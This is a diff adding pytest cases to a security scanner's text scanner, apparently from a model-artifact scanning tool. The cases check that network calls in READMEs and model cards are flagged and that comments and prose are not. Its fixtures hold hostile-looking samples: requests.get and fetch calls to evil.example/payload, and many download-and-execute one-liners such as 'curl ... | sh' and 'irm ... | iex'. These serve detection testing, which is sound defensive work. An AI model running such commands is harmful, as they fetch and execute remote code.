@@ -87,8 +87,31 @@ def test_text_scanner_routes_localized_readme_through_security_detectors(tmp_pat
     )
 
 
-@pytest.mark.parametrize("filename", ["README.md.bak", "README.png"])
-def test_text_scanner_does_not_claim_readme_near_matches(tmp_path: Path, filename: str) -> None:
+@pytest.mark.parametrize("filename", ["model_card.en.md", "modelcard.fr.rst"])
+def test_text_scanner_routes_localized_model_cards_through_security_detectors(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
+
+    result = scan_file(str(text_path), config={"cache_scan_results": False})
+
+    assert TextScanner.can_handle(str(text_path))
+    assert result.scanner_name == "text"
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "filename",
+    ["README.md.bak", "README.png", "model_card.en.md.bak", "model_card.png", "model_cardish.md", "modelcard"],
+)
+def test_text_scanner_does_not_claim_documentation_near_matches(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
 
@@ -165,6 +188,8 @@ def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
         "Webhook documentation: https://docs.example.com/webhooks\n",
         "C2 research: https://example.com/security\n",
         "config = {}  # docs: https://example.com/configuration\n",
+        "The result = https://example.com/reference in this example.\n",
+        'The result = "https://example.com/reference" in this example.\n',
     ],
 )
 def test_text_scanner_generic_documentation_url_labels_are_informational(
@@ -186,6 +211,9 @@ def test_text_scanner_generic_documentation_url_labels_are_informational(
     [
         'class Loader: "https://evil.example/payload"\n',
         'def load(): return "https://evil.example/payload"\n',
+        'class Loader:\n    source = "https://evil.example/payload"\n',
+        'def load():\n    return "https://evil.example/payload"\n',
+        'def load():\n    if enabled:\n        return "https://evil.example/payload"\n',
     ],
 )
 def test_text_scanner_python_definitions_with_urls_remain_actionable(tmp_path: Path, content: str) -> None:
@@ -237,6 +265,88 @@ def test_text_scanner_executable_html_resource_remains_actionable(tmp_path: Path
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        '<!-- requests.get("https://evil.example/payload") -->\n',
+        "<!-- endpoint: https://evil.example/payload -->\n",
+        '/* requests.get("https://evil.example/payload") */\n',
+    ],
+)
+def test_text_scanner_documentation_block_comments_are_informational(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_text_scanner_code_after_closed_documentation_comment_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        '<!-- requests.get("https://docs.example.com/reference") -->\nrequests.get("https://evil.example/payload")\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize("comment", ["<!-- requests.get(endpoint) -->", "/* requests.get(endpoint) */"])
+def test_text_scanner_commented_occurrence_does_not_hide_later_network_call(
+    tmp_path: Path,
+    comment: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(f"{comment}\nrequests.get(endpoint)\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'download(marker="/*", url="https://evil.example/payload")\n',
+        'download(marker="<!--", url="https://evil.example/payload")\n',
+        'const marker = "/*"; fetch("https://evil.example/payload")\n',
+        'const marker = `/*`; fetch("https://evil.example/payload")\n',
+        'const marker = `<!--`; fetch("https://evil.example/payload")\n',
+    ],
+)
+def test_text_scanner_comment_delimiters_inside_strings_do_not_hide_code(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_text_scanner_truncated_quote_state_does_not_hide_code(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        'download("' + ("A" * (4096 + 4)) + '/* https://evil.example/payload")\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
 def test_text_scanner_documentation_network_api_prose_is_informational(tmp_path: Path) -> None:
@@ -555,6 +665,26 @@ def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
         "RUN --mount=type=cache curl https://example.com/artifact | sh\n",
         "Example: curl https://example.com/artifact | sh\n",
         "Example: RUN sudo curl https://example.com/artifact | sh\n",
+        'bash -e -c "curl https://example.com/artifact | sh"\n',
+        'bash -lc "wget https://example.com/artifact"\n',
+        "cmd /c curl https://example.com/artifact\n",
+        "cmd.exe /C wget https://example.com/artifact\n",
+        "irm https://example.com/artifact | iex\n",
+        "Invoke-RestMethod https://example.com/artifact\n",
+        "curl.exe https://example.com/artifact\n",
+        "wget.exe https://example.com/artifact\n",
+        "command curl https://example.com/artifact\n",
+        "exec wget https://example.com/artifact\n",
+        "nohup curl https://example.com/artifact &\n",
+        'eval "curl https://example.com/artifact"\n',
+        "echo https://example.com/artifact | xargs curl\n",
+        'RUN ["curl", "https://example.com/artifact"]\n',
+        'CMD ["wget", "https://example.com/artifact"]\n',
+        'command: ["curl", "https://example.com/artifact"]\n',
+        "/usr/bin/curl https://example.com/artifact\n",
+        'RUN ["/usr/bin/curl", "https://example.com/artifact"]\n',
+        'ENTRYPOINT ["sh", "-c", "curl https://example.com/artifact"]\n',
+        'RUN ["/bin/bash", "-lc", "wget https://example.com/artifact"]\n',
     ],
 )
 def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path: Path, content: str) -> None:
@@ -585,6 +715,13 @@ def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path:
         "RUN documents curl at https://docs.example.com/docker.\n",
         "RUN --mount documents curl at https://docs.example.com/docker.\n",
         "Example: use curl for downloads; see https://docs.example.com/shell.\n",
+        "Use bash -lc for login shells; see https://docs.example.com/shell.\n",
+        "The cmd /c curl syntax is documented at https://docs.example.com/cmd.\n",
+        "Use irm for REST calls; see https://docs.example.com/powershell.\n",
+        "curl.exe is documented at https://docs.example.com/windows.\n",
+        "The command and exec builtins are documented at https://docs.example.com/shell.\n",
+        'The command array ["curl", URL] is documented at https://docs.example.com/config.\n',
+        "/usr/bin/curl is documented at https://docs.example.com/shell.\n",
     ],
 )
 def test_text_scanner_documentation_command_prefix_prose_remains_informational(
@@ -949,6 +1086,10 @@ def test_text_scanner_documentation_code_like_prose_links_remain_informational(
         '{"webhook_urls": ["https://evil.example/payload"]}\n',
         "<endpoint>https://evil.example/payload</endpoint>\n",
         'endpoint = {"url": "https://evil.example/payload"}\n',
+        'endpoint = {\n  "url": "https://evil.example/payload"\n}\n',
+        '- endpoint = "https://evil.example/payload"\n',
+        'if enabled: endpoint = "https://evil.example/payload"\n',
+        'for item in items: endpoint = "https://evil.example/payload"\n',
         "endpoint:\n  url: https://evil.example/payload\n",
         "Callback endpoint: https://evil.example/payload\n",
         "Webhook documentation endpoint: https://evil.example/payload\n",
@@ -1757,6 +1898,35 @@ def test_text_scanner_documentation_classification_limit_is_shared(monkeypatch: 
 
     assert incomplete is True
     assert checks == 1_024
+
+
+def test_text_scanner_documentation_retarget_caches_absent_token_searches(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    payload = (b"To use it, import requests before downloading weights.\n" * 64) + (b"x" * 1024 * 1024)
+    finding = {
+        "type": "network_library",
+        "library": "requests",
+        "pattern": "requests",
+        "severity": "HIGH",
+        "position": 18,
+    }
+    calls_by_token: dict[bytes, int] = {}
+    original = TextScanner._find_documentation_token
+
+    def count_searches(data: bytes, token_bytes: bytes, start: int) -> int:
+        calls_by_token[token_bytes] = calls_by_token.get(token_bytes, 0) + 1
+        return original(data, token_bytes, start)
+
+    monkeypatch.setattr(TextScanner, "_find_documentation_token", staticmethod(count_searches))
+
+    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, [finding])
+
+    assert incomplete is False
+    assert calls_by_token[b"from requests"] == 1
+    assert calls_by_token[b"requests.connect"] == 1
+    assert calls_by_token[b"requests.request"] == 1
+    assert calls_by_token[b"requests.__init__"] == 1
 
 
 def test_text_scanner_passive_vocabulary_network_limit_is_informational(tmp_path: Path) -> None:
